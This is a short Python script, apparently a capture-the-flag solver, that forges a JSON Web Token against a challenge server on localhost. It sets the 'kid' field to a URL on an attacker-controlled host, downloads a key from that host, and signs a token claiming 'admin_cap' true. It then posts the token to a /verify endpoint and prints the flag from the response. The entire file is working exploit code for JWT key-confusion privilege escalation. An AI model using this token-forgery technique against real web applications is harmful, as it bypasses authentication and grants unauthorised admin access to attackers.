import requests, jwt
from bs4 import BeautifulSoup as bs


url = 'http://localhost:5000/'  # chall url

r = requests.post(url + '/login', data='{"username" : "user"}')


payload = {
    'user': "guest",
    'admin_cap': 'true',
    'kid': "http://localhost:7000/hack.txt" # changed to attackers ip
}


cook = jwt.encode(payload, requests.get(
    payload['kid']).text, algorithm='HS256')

h = requests.post(url + 'verify', cookies={'token' : cook})

# print(h.text)

soup = bs(h.text, 'html.parser')
tag = soup.code.text

print(tag)